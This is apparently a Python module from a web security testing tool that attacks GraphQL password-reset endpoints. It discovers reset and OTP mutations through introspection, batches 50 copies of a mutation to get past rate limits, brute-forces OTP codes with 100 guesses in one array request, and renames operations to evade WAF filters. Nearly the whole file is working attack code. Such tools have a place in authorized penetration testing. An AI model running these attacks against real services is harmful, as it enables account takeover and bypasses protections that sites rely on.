#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import json as _json
from utils.style import Colors
from utils.utils import requests
from utils import live


OTP_KEYWORDS = ["verifyotp", "verifycode", "verifytoken", "checkotp", "submitotp",
                 "validatetoken", "confirmcode", "verifypin", "validateotp"]

RESET_KEYWORDS = ["password", "reset", "forgot", "recover", "otp", "token",
                  "verify", "confirm", "pin", "unlock"]


def _is_graphql(body, headers):
    ct = ""
    for k, v in headers.items():
        if k.lower() == "content-type":
            ct = v.lower()
            break
    if "application/json" not in ct:
        return False
    try:
        data = _json.loads(body)
        return isinstance(data, dict) and "query" in data
    except Exception:
        return False


def _parse_gql_body(body):
    try:
        data = _json.loads(body)
        return data.get("query", ""), data.get("operationName", ""), data.get("variables", {})
    except Exception:
        return "", "", {}


def _run_introspection(uri, headers, proxies):
    query = {
        "query": (
            "{ __schema { mutationType { fields { name args { "
            "name type { name kind ofType { name kind } } } } } } }"
        )
    }
    try:
        resp = requests.post(
            uri, json=query, headers=headers,
            verify=False, allow_redirects=False, timeout=15, proxies=proxies,
        )
        if resp.status_code == 200:
            data = resp.json()
            return (
                data.get("data", {})
                    .get("__schema", {})
                    .get("mutationType", {})
                    .get("fields", [])
            )
    except Exception:
        pass
    return None


def graphql(url, parsed_req, baseline, interact, email, proxy=None):
    """
    GraphQL-specific password reset attacks.
    Phase 1: Introspection — discover hidden reset/OTP mutations.
    Phase 2: Batch mutations — send N copies in one array to bypass rate limiting.
    Phase 3: Alias attack — pack N OTP guesses in a single request.
    Phase 4: Operation name bypass — WAF/rate-limit evasion via renamed operations.
    """
    print(f"{Colors.CYAN} ├ GraphQL analysis{Colors.RESET}")

    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    original_host = parsed_req["host"]
    path = parsed_req["path"]
    scheme = "https" if "https" in url else "http"
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if not _is_graphql(body, headers):
        print(f"  {Colors.YELLOW}[!] Not a GraphQL request — skipping{Colors.RESET}")
        return

    query, op_name, variables = _parse_gql_body(body)
    print(f"{Colors.CYAN}   └── Operation: {op_name or '(none)'} | vars: {list(variables.keys())}{Colors.RESET}")

    # ── Phase 1: Introspection ─────────────────────────────────────────────────
    print(f"{Colors.CYAN} └─ Introspection{Colors.RESET}")
    fields = _run_introspection(uri, headers, proxies)

    if fields is None:
        print(f"{Colors.YELLOW}   └── [!] Introspection disabled or failed{Colors.RESET}")
    elif not fields:
        print(f"{Colors.YELLOW}   └── [-] No mutations found{Colors.RESET}")
    else:
        reset_found = [
            f for f in fields
            if any(kw in f.get("name", "").lower() for kw in RESET_KEYWORDS)
        ]
        if reset_found:
            for f in reset_found:
                args_str = ", ".join(
                    f"{a['name']}: {(a.get('type') or {}).get('name') or '?'}"
                    for a in f.get("args", [])
                )
                print(f"{Colors.RED}   └── [+] {f['name']}({args_str}){Colors.RESET}")
        else:
            print(f"{Colors.GREEN}   └── [-] No reset-related mutations via introspection{Colors.RESET}")

    # ── Phase 2: Batch mutations (rate-limit bypass) ───────────────────────────
    print(f"{Colors.CYAN} └─ Batch mutations (rate-limit bypass){Colors.RESET}")
    BATCH_SIZE = 50
    try:
        original = _json.loads(body)
    except Exception:
        original = {"query": query, "operationName": op_name, "variables": variables}

    try:
        resp = requests.post(
            uri, json=[original] * BATCH_SIZE, headers=headers,
            verify=False, allow_redirects=False, timeout=20, proxies=proxies,
        )
        if resp.status_code in (200, 201, 202):
            try:
                data = resp.json()
                if isinstance(data, list):
                    successes = sum(
                        1 for item in data
                        if isinstance(item, dict)
                        and not item.get("errors")
                        and item.get("data") is not None
                    )
                    if successes > 1:
                        print(
                            f"{Colors.RED}   └── [CRITICAL] Batch accepted: {successes}/{BATCH_SIZE} "
                            f"mutations OK → rate-limit bypass via GraphQL batching{Colors.RESET}"
                        )
                    else:
                        print(
                            f"{Colors.GREEN}   └── [OK] Batch limited: {successes}/{BATCH_SIZE} "
                            f"succeeded{Colors.RESET}"
                        )
                else:
                    print(
                        f"{Colors.YELLOW}   └── [MEDIUM] Server returned single object to batch array "
                        f"→ batching unsupported or silently ignored{Colors.RESET}"
                    )
            except Exception:
                print(f"{Colors.YELLOW}   └── [-] Could not parse batch response ({resp.status_code}){Colors.RESET}")
        elif resp.status_code == 400:
            print(f"{Colors.GREEN}   └── [OK] Batch rejected (400){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}   └── [-] Batch returned {resp.status_code}{Colors.RESET}")
    except requests.RequestException as e:
        print(f"  {Colors.RED}[!] Batch error: {e}{Colors.RESET}")

    # ── Phase 3: Alias attack (OTP brute-force) ────────────────────────────────
    print(f"{Colors.CYAN} └─ Alias attack (OTP brute-force in one request){Colors.RESET}")

    code_var = None
    for var_name in variables:
        if any(kw in var_name.lower() for kw in ["code", "otp", "pin", "token"]):
            code_var = var_name
            break

    # Also check introspected mutations for OTP-like args
    if fields and not code_var:
        for f in fields:
            if any(kw == f.get("name", "").lower() for kw in OTP_KEYWORDS):
                for arg in f.get("args", []):
                    if any(kw in arg["name"].lower() for kw in ["code", "otp", "pin", "token"]):
                        code_var = arg["name"]
                        break
                if code_var:
                    break

    if code_var:
        ALIAS_COUNT = 100
        aliases = [
            {"query": query, "operationName": op_name,
             "variables": {**variables, code_var: str(i).zfill(4)}}
            for i in range(ALIAS_COUNT)
        ]
        try:
            resp = requests.post(
                uri, json=aliases, headers=headers,
                verify=False, allow_redirects=False, timeout=30, proxies=proxies,
            )
            if resp.status_code in (200, 201):
                try:
                    data = resp.json()
                    if isinstance(data, list):
                        hits = [
                            i for i, item in enumerate(data)
                            if isinstance(item, dict)
                            and not item.get("errors")
                            and item.get("data") is not None
                        ]
                        if hits:
                            for idx in hits[:3]:
                                print(
                                    f"{Colors.RED}   └── [CRITICAL] OTP hit at index {idx} "
                                    f"(code={str(idx).zfill(4)}) — {len(hits)} guess(es) accepted{Colors.RESET}"
                                )
                        else:
                            print(
                                f"{Colors.GREEN}   └── [OK] All {ALIAS_COUNT} OTP guesses rejected{Colors.RESET}"
                            )
                    else:
                        print(
                            f"{Colors.YELLOW}   └── [MEDIUM] Server returned non-array to alias batch{Colors.RESET}"
                        )
                except Exception:
                    print(f"{Colors.YELLOW}   └── [-] Could not parse alias attack response{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}   └── [-] Alias attack returned {resp.status_code}{Colors.RESET}")
        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] Alias attack error: {e}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}   └── [-] No OTP/code variable detected — alias attack skipped{Colors.RESET}")
        print(
            f"{Colors.YELLOW}   └── [i] Manual: batch N requests with different code values "
            f"in a single array body{Colors.RESET}"
        )

    # ── Phase 4: Operation name bypass ────────────────────────────────────────
    print(f"{Colors.CYAN} └─ Operation name bypass (WAF/rate-limit){Colors.RESET}")

    bypass_names = ["Q", "M", "Op", "HarmlessOp", "IntrospectionQuery"]
    if op_name:
        bypass_names += [
            op_name + "_copy",
            op_name.lower(),
            op_name.replace("Password", "Pwd") if "Password" in op_name else op_name + "2",
        ]
    bypass_names = [n for n in bypass_names if n != op_name]

    bypass_found = False
    for bypass_name in bypass_names[:6]:
        live.testing(f"graphql opname bypass {bypass_name}")
        renamed_query = query.replace(op_name, bypass_name, 1) if op_name else query
        renamed_body = {
            "query": renamed_query,
            "operationName": bypass_name,
            "variables": variables,
        }
        try:
            resp = requests.post(
                uri, json=renamed_body, headers=headers,
                verify=False, allow_redirects=False, timeout=10, proxies=proxies,
            )
            if resp.status_code == baseline["status"]:
                bl, rl = baseline["body_length"], len(resp.text)
                if bl == 0 or abs(rl - bl) / bl < 0.15:
                    print(
                        f"{Colors.YELLOW}   └── [INFO] operationName '{bypass_name}' accepted "
                        f"({resp.status_code}) — WAF may only filter original name{Colors.RESET}"
                    )
                    bypass_found = True
                    break
        except requests.RequestException:
            pass

    if not bypass_found:
        print(f"{Colors.GREEN}   └── [-] No operation name bypass detected{Colors.RESET}")
